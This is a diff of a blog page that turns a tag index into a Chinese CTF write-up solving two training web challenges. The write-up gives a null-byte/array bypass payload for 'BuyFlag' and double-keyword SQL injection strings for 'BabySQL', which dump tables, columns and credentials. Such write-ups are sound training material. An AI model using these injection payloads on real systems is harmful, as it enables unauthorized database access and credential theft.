@@ -81,15 +81,25 @@
 
 
 
-<meta name="description" content="学而专，专而精。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Da4er&#39;s Blogs">
-<meta property="og:url" content="https://da4er.top/tags/Python/index.html">
+<meta name="description" content="BuyFlag查看网页源代码找到一处php代码：  抓包查看：将user&#x3D;1  然后绕过is_numeric函数，通过%00截断绕过。  然后需要money字段，用到数组绕过。  payload： 1password&#x3D;404%00&amp;money[]&#x3D;100000000   BabySQL通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2.8 [极客大挑战 2019]BuyFlag&amp;BabySQL">
+<meta property="og:url" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html">
 <meta property="og:site_name" content="Da4er&#39;s Blogs">
-<meta property="og:description" content="学而专，专而精。">
+<meta property="og:description" content="BuyFlag查看网页源代码找到一处php代码：  抓包查看：将user&#x3D;1  然后绕过is_numeric函数，通过%00截断绕过。  然后需要money字段，用到数组绕过。  payload： 1password&#x3D;404%00&amp;money[]&#x3D;100000000   BabySQL通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过">
+<meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png">
+<meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png">
+<meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png">
+<meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/4.png">
+<meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/5.png">
+<meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/6.png">
+<meta property="og:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/7.png">
+<meta property="article:published_time" content="2020-02-08T14:38:51.000Z">
+<meta property="article:modified_time" content="2020-02-08T14:40:34.017Z">
 <meta property="article:author" content="Da4er&#39;s">
-<meta property="article:tag" content="Web安全 代码审计">
+<meta property="article:tag" content="Da4er">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png">
 
 
 
@@ -119,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="https://da4er.top/tags/Python/"/>
+  <link rel="canonical" href="https://da4er.top/2-8-极客大挑战-2019-BuyFlag-BabySQL.html"/>
 
 
 
 
 
-  <title>标签: Python | Da4er's Blogs</title>
+  <title>2.8 [极客大挑战 2019]BuyFlag&BabySQL | Da4er's Blogs</title>
   
 
 
@@ -144,7 +154,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -238,54 +248,229 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>Python<small>标签</small>
-        </h2>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html">
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da4er's">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da4er's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/Python-Pillow%E5%BA%93%E5%AD%A6%E4%B9%A0.html" itemprop="url">
-              
-                <span itemprop="name">Python Pillow库学习</span>
-              
-            </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">2.8 [极客大挑战 2019]BuyFlag&BabySQL</h2>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-11-08T18:19:19+08:00"
-              content="2019-11-08" >
-          11-08
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-08T22:38:51+08:00">
+                2020-02-08
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html" class="leancloud_visitors" data-flag-title="2.8 [极客大挑战 2019]BuyFlag&BabySQL">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  189
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><strong>查看网页源代码找到一处php代码：</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png" class title="Da4er">
+<p><strong>抓包查看：将user=1</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png" class title="Da4er">
+<p><strong>然后绕过is_numeric函数，通过%00截断绕过。</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png" class title="Da4er">
+<p><strong>然后需要money字段，用到数组绕过。</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/4.png" class title="Da4er">
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;404%00&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><strong>通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普通的sql注入语句加上双写关键字即可完成注入。</strong></p>
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/5.png" class title="Da4er">
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/6.png" class title="Da4er">
+<img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/7.png" class title="Da4er">
+<p>使用的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询表名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;admi&#39; uniunionon selselectect 1,group_concat(concat_ws(&#39;:&#39;,username,passwoorrd)),3 frofromm b4bsql --+</span><br></pre></td></tr></table></figure>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2-8-SUCTF2018-followme.html" rel="next" title="2.8 [SUCTF2018]followme">
+                <i class="fa fa-chevron-left"></i> 2.8 [SUCTF2018]followme
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -293,6 +478,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODUyMy8yNTAxNw=="></div>
+    </div>
+
+  
+  
+
 
         </div>
         
@@ -313,8 +507,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -421,6 +624,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#BuyFlag"><span class="nav-number">1.</span> <span class="nav-text">BuyFlag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BabySQL"><span class="nav-number">2.</span> <span class="nav-text">BabySQL</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -575,6 +794,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -603,6 +826,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
